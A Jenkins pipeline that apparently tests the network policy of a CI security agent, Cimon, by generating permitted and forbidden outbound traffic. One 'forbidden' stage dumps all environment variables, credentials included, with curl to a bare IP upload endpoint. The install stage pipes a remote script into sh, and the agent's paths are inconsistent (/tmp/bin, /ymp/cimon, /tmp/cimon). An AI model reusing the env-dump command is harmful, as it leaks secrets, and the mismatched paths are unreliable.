pipeline {
    agent any
    
    options {
        disableConcurrentBuilds()
    }

    stages {
        stage('Install Cimon') {
            steps {
                sh 'curl -sSfL https://cimon-releases.s3.amazonaws.com/install.sh | sh -s -- -b /tmp/bin'
            }
        }
        
        stage('Build') { 
            steps {
                sh 'cat cycode.txt' 
            }
        }

        stage('Run Cimon') {
            environment {
                CIMON_CLIENT_ID = credentials("cimon-client-id")
                CIMON_SECRET = credentials("cimon-secret")
            }
            steps {
                sh '/ymp/cimon agent start-background'
            }
        }

        stage('Allowed network traffic') {
            steps {
                sh 'curl -sm 1 https://34.121.34.97 || true'
            }
        }

        stage('Allowed network traffic (hostname)') {
            steps {
                sh 'wget --quiet --timeout 1 https://cycode.com || true'
                sh 'wget --quiet --timeout 1 https://registry.npmjs.org || true'
            }
        }

        stage('Forbidden network traffic (IP)') {
            steps {
                sh 'curl -sm 1 -d "$(env)" https://34.121.34.100/upload/v2 || true'
            }
        }

        stage('Forbidden network traffic (hostname)') {
            steps {
                sh 'wget --quiet --timeout 1 https://yahoo.com || true'
            }
        }
    }
    post {
        always {
            sh '/tmp/cimon agent stop'
        }
    }
}
